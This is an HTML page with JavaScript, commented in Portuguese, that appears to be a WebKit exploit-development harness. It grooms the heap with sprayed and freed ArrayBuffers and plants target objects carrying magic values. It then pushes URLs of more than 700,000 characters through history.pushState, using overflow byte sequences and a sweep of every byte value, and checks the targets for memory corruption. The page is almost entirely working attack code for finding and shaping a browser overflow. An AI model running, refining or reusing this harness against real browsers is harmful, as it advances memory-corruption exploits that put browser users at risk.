<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>WebKit 6-3-1 Optimized</title>
</head>
<body>

<h1>WebKit 6-3-1 - Otimizado</h1>

<h2>DESCOBERTA: Teste 3 consome 8 bytes por execução!</h2>
<p><strong>Solução:</strong> Reduzir repetições + remover setTimeout travado</p>

<hr>

<h2>Executar Sequência Otimizada</h2>
<button onclick="executeOptimized()">▶ EXECUTAR 6-3-1 OTIMIZADO</button>

<hr>

<h2>Configurações</h2>
<label>Teste 6 - Start:</label>
<input type="number" id="t6start" value="1000" min="100" max="50000">
<label>Step:</label>
<input type="number" id="t6step" value="5000" min="100" max="10000">
<br>
<label>Teste 3 - Repetições:</label>
<input type="number" id="t3reps" value="200" min="50" max="1000">
<span style="font-size: 11px; color: #888;">(Original: 1000, consome muita quota)</span>

<hr>

<h2>Testes Individuais</h2>
<button onclick="test6_Incremental()">Teste 6</button>
<button onclick="test3_Optimized()">Teste 3 Otimizado</button>
<button onclick="test1_Immediate()">Teste 1 Imediato</button>

<hr>

<h2>Monitoramento de Quota</h2>
<div id="quota" style="background: #f0f0f0; padding: 10px; margin: 10px 0; border-radius: 5px;">
    <strong>Operações realizadas:</strong> <span id="quotaCount">0</span><br>
    <strong>Status:</strong> <span id="quotaStatus">OK</span>
</div>

<hr>

<button onclick="clearLog()">Limpar Log</button>

<hr>

<div id="log"></div>

<script>
const BASE_SAFE = 709522;

let heapObjects = [];
let targetObjects = [];
let functionTargets = [];
let stringTargets = [];
let arrayTargets = [];

let quotaUsed = 0;

// ===================================================================
// LOGGING
// ===================================================================
function log(msg) {
    const el = document.getElementById('log');
    const time = new Date().toLocaleTimeString();
    el.innerHTML += `<div>[${time}] ${msg}</div>`;
    el.scrollTop = el.scrollHeight;
}

function clearLog() {
    document.getElementById('log').innerHTML = '';
    quotaUsed = 0;
    updateQuota();
    log('Sistema limpo - Quota resetada');
}

function updateQuota() {
    document.getElementById('quotaCount').textContent = quotaUsed;
    const status = document.getElementById('quotaStatus');
    
    if (quotaUsed < 5) {
        status.textContent = 'OK';
        status.style.color = 'green';
    } else if (quotaUsed < 10) {
        status.textContent = 'ATENÇÃO';
        status.style.color = 'orange';
    } else {
        status.textContent = 'CRÍTICO';
        status.style.color = 'red';
    }
}

// ===================================================================
// PREPARAÇÃO
// ===================================================================
function prepareHeap() {
    log('Preparando heap...');
    
    heapObjects = [];
    targetObjects = [];
    
    for (let i = 0; i < 500; i++) {
        const buf = new ArrayBuffer(1024);
        const view = new Uint32Array(buf);
        view.fill(0x41414141);
        heapObjects.push({buf, view});
    }
    
    for (let i = 0; i < heapObjects.length; i += 3) {
        heapObjects[i] = null;
    }
    
    for (let i = 0; i < 50; i++) {
        const buf = new ArrayBuffer(1024);
        const view = new Uint32Array(buf);
        view.fill(0xDEADBEEF);
        targetObjects.push({
            id: i,
            magic: 0xCAFEBABE,
            buf: buf,
            view: view
        });
    }
    
    log('Heap preparado: 500 spray + 50 alvos');
}

function prepareAdvancedTargets() {
    log('Criando alvos avançados...');
    
    functionTargets = [];
    for (let i = 0; i < 50; i++) {
        const expectedReturn = 0x90000000 + i;
        const func = new Function('', `return 0x${expectedReturn.toString(16)};`);
        functionTargets.push({
            id: i,
            func: func,
            expected: expectedReturn
        });
    }
    
    stringTargets = [];
    for (let i = 0; i < 50; i++) {
        const str = "TARGET_" + i + "_" + "X".repeat(100);
        stringTargets.push({
            id: i,
            original: str,
            current: str
        });
    }
    
    arrayTargets = [];
    for (let i = 0; i < 50; i++) {
        const arr = new Array(100);
        for (let j = 0; j < 100; j++) {
            arr[j] = 0x50000000 + i * 1000 + j;
        }
        arrayTargets.push({
            id: i,
            array: arr,
            originalLength: arr.length
        });
    }
    
    log(`  ${functionTargets.length} funções + ${stringTargets.length} strings + ${arrayTargets.length} arrays`);
}

// ===================================================================
// VERIFICAÇÃO
// ===================================================================
function checkCorruption() {
    let corrupted = 0;
    for (let i = 0; i < Math.min(10, targetObjects.length); i++) {
        try {
            const t = targetObjects[i];
            if (t.magic !== 0xCAFEBABE) {
                log(`  Buffer ${i}: magic=0x${t.magic.toString(16)}`);
                corrupted++;
            }
            if (t.view[0] !== 0xDEADBEEF) {
                log(`  Buffer ${i}: view=0x${t.view[0].toString(16)}`);
                corrupted++;
            }
        } catch (e) {
            log(`  Buffer ${i}: DESTROYED`);
            corrupted++;
        }
    }
    return corrupted;
}

function checkAdvancedCorruption() {
    let funcCorrupted = 0;
    let strCorrupted = 0;
    let arrCorrupted = 0;
    let details = [];
    
    for (let i = 0; i < Math.min(20, functionTargets.length); i++) {
        const t = functionTargets[i];
        try {
            const result = t.func();
            if (isNaN(result)) {
                funcCorrupted++;
                details.push(`Function ${i}: NaN`);
            } else if (result !== t.expected) {
                funcCorrupted++;
                details.push(`Function ${i}: 0x${result.toString(16)}`);
            }
        } catch (e) {
            funcCorrupted++;
            details.push(`Function ${i}: CRASH`);
        }
    }
    
    for (let i = 0; i < Math.min(20, stringTargets.length); i++) {
        const t = stringTargets[i];
        if (t.current.length !== t.original.length || t.current !== t.original) {
            strCorrupted++;
            details.push(`String ${i}: alterada`);
        }
    }
    
    for (let i = 0; i < Math.min(20, arrayTargets.length); i++) {
        const t = arrayTargets[i];
        try {
            const expected = 0x50000000 + i * 1000;
            if (t.array.length !== t.originalLength || t.array[0] !== expected) {
                arrCorrupted++;
                details.push(`Array ${i}: alterado`);
            }
        } catch (e) {
            arrCorrupted++;
            details.push(`Array ${i}: ERROR`);
        }
    }
    
    return {
        total: funcCorrupted + strCorrupted + arrCorrupted,
        functions: funcCorrupted,
        strings: strCorrupted,
        arrays: arrCorrupted,
        details: details
    };
}

// ===================================================================
// TESTE 6: INCREMENTAL (ORIGINAL)
// ===================================================================
async function test6_Incremental() {
    log('================================');
    log('TESTE 6: EXPLORAÇÃO INCREMENTAL');
    log('================================');
    
    prepareHeap();
    
    const start = parseInt(document.getElementById('t6start').value);
    const step = parseInt(document.getElementById('t6step').value);
    
    log(`Start: ${start} bytes, Step: ${step}`);
    
    let currentSize = start;
    let maxSuccess = 0;
    
    for (let i = 0; i < 10; i++) {
        log(`Tentativa ${i+1}: ${currentSize} bytes`);
        
        try {
            const base = "A".repeat(BASE_SAFE);
            let overflow = "";
            for (let j = 0; j < currentSize; j++) {
                overflow += String.fromCharCode(j % 33);
            }
            
            history.pushState({}, `inc_${currentSize}`, "/" + base + overflow);
            quotaUsed++;
            updateQuota();
            
            log(`  OK (quota: ${quotaUsed})`);
            maxSuccess = currentSize;
            currentSize += step;
            
            await new Promise(r => setTimeout(r, 1500));
            
        } catch (e) {
            log(`  CRASH: ${e.message}`);
            break;
        }
    }
    
    log(`=== Máximo sem crash: ${maxSuccess} bytes ===`);
}

// ===================================================================
// TESTE 3: OTIMIZADO (REDUZIDO)
// ===================================================================
function test3_Optimized() {
    log('================================');
    log('TESTE 3: SEQUÊNCIAS OTIMIZADO');
    log('================================');
    
    prepareHeap();
    
    const reps = parseInt(document.getElementById('t3reps').value);
    log(`Repetições: ${reps} (original era 1000)`);
    
    const sequences = [
        { name: "Null", bytes: [0x00, 0x00, 0x00, 0x00] },
        { name: "Newlines", bytes: [0x0A, 0x0A, 0x0A, 0x0A] },
        { name: "Tabs", bytes: [0x09, 0x09, 0x09, 0x09] },
        { name: "CR", bytes: [0x0D, 0x0D, 0x0D, 0x0D] },
        { name: "Space", bytes: [0x20, 0x20, 0x20, 0x20] },
        { name: "Mixed", bytes: [0x00, 0x09, 0x0A, 0x0D, 0x20] },
        { name: "Control", bytes: [0x01, 0x02, 0x03, 0x04, 0x05] },
        { name: "Bell", bytes: [0x07, 0x08, 0x08, 0x07] }
    ];
    
    for (let seq of sequences) {
        try {
            const base = "A".repeat(BASE_SAFE);
            let overflow = "";
            
            for (let i = 0; i < reps; i++) {
                for (let byte of seq.bytes) {
                    overflow += String.fromCharCode(byte);
                }
            }
            
            history.pushState({}, seq.name, "/" + base + overflow);
            quotaUsed++;
            updateQuota();
            
            log(`${seq.name}: OK (quota: ${quotaUsed})`);
            
        } catch (e) {
            log(`${seq.name}: ${e.message}`);
        }
    }
    
    log('=== Teste 3 concluído ===');
    
    // VERIFICAÇÃO IMEDIATA (SEM setTimeout!)
    log('Verificando corrupção básica...');
    const corrupted = checkCorruption();
    if (corrupted > 0) {
        log(`>>> ${corrupted} buffers corrompidos!`);
    } else {
        log('Sem corrupção em buffers');
    }
}

// ===================================================================
// TESTE 1: DETECÇÃO IMEDIATA (SEM setTimeout!)
// ===================================================================
function test1_Immediate() {
    log('================================');
    log('TESTE 1: DETECÇÃO IMEDIATA');
    log('================================');
    
    prepareHeap();
    prepareAdvancedTargets();
    
    log(`Quota atual: ${quotaUsed}`);
    log('Testando bytes 0x00-0xFF...');
    
    const allowedBytes = [];
    const crashBytes = [];
    
    for (let byte = 0x00; byte <= 0xFF; byte++) {
        try {
            const base = "A".repeat(BASE_SAFE);
            const testByte = String.fromCharCode(byte);
            const overflow = testByte.repeat(100);
            
            history.pushState({}, `test_${byte}`, "/" + base + overflow);
            quotaUsed++;
            
            allowedBytes.push(byte);
            
            if (byte % 32 === 0) {
                log(`0x${byte.toString(16).padStart(2, '0')}... OK`);
            }
            
        } catch (e) {
            crashBytes.push(byte);
            if (byte % 32 === 0) {
                log(`0x${byte.toString(16).padStart(2, '0')}... CRASH`);
            }
        }
    }
    
    updateQuota();
    
    log('');
    log('=== MAPEAMENTO ===');
    log(`Permitidos: ${allowedBytes.length}`);
    if (allowedBytes.length > 0) {
        log(`Range: 0x${Math.min(...allowedBytes).toString(16)} - 0x${Math.max(...allowedBytes).toString(16)}`);
        log(`Lista: [${allowedBytes.slice(0, 10).map(b => '0x'+b.toString(16).padStart(2,'0')).join(', ')}...]`);
    }
    log(`Crasham: ${crashBytes.length}`);
    
    // VERIFICAÇÃO IMEDIATA (SEM setTimeout!)
    log('');
    log('=== VERIFICAÇÃO IMEDIATA ===');
    
    const basicCorrupted = checkCorruption();
    log(`Buffers corrompidos: ${basicCorrupted}`);
    
    log('Verificando alvos avançados...');
    const advanced = checkAdvancedCorruption();
    
    log(`Total: ${advanced.total}`);
    log(`  Funções: ${advanced.functions}/${functionTargets.length}`);
    log(`  Strings: ${advanced.strings}/${stringTargets.length}`);
    log(`  Arrays: ${advanced.arrays}/${arrayTargets.length}`);
    
    if (advanced.total > 0) {
        log('');
        log('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!');
        log(`CORRUPÇÃO! ${advanced.total} alvos`);
        log('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!');
        log('');
        for (let detail of advanced.details.slice(0, 10)) {
            log(`  ${detail}`);
        }
    }
    
    if (allowedBytes.length !== 33 && allowedBytes.length > 0) {
        log('');
        log('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!');
        log('COMPORTAMENTO ANÔMALO!');
        log(`Esperado: 33, Obtido: ${allowedBytes.length}`);
        log('QUOTA INSTÁVEL!');
        log('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!');
    }
}

// ===================================================================
// SEQUÊNCIA OTIMIZADA
// ===================================================================
async function executeOptimized() {
    log('═══════════════════════════════════════');
    log('SEQUÊNCIA 6-3-1 OTIMIZADA');
    log('═══════════════════════════════════════');
    
    clearLog();
    
    log('Melhorias:');
    log('- Teste 3: 200 repetições (vs 1000 original)');
    log('- Verificações: IMEDIATAS (sem setTimeout)');
    log('- Monitoramento: Quota em tempo real');
    log('');
    
    // Criar TUDO no início
    prepareHeap();
    prepareAdvancedTargets();
    
    await new Promise(r => setTimeout(r, 1000));
    
    log('═══ TESTE 6 ═══');
    await test6_Incremental();
    
    await new Promise(r => setTimeout(r, 2000));
    
    log('');
    log('═══ TESTE 3 OTIMIZADO ═══');
    test3_Optimized();
    
    await new Promise(r => setTimeout(r, 2000));
    
    log('');
    log('═══ TESTE 1 IMEDIATO ═══');
    test1_Immediate();
    
    await new Promise(r => setTimeout(r, 1000));
    
    log('');
    log('═══════════════════════════════════════');
    log('SEQUÊNCIA CONCLUÍDA');
    log(`Quota final: ${quotaUsed}`);
    log('═══════════════════════════════════════');
}

// ===================================================================
// INICIALIZAÇÃO
// ===================================================================
log('WebKit 6-3-1 Otimizado');
log('');
log('CORREÇÕES:');
log('1. Teste 3: Reduzido de 1000 para 200 repetições');
log('2. Removido setTimeout que travava');
log('3. Verificações são IMEDIATAS');
log('4. Monitoramento de quota em tempo real');
log('');
log('Execute "6-3-1 OTIMIZADO" para iniciar');
</script>
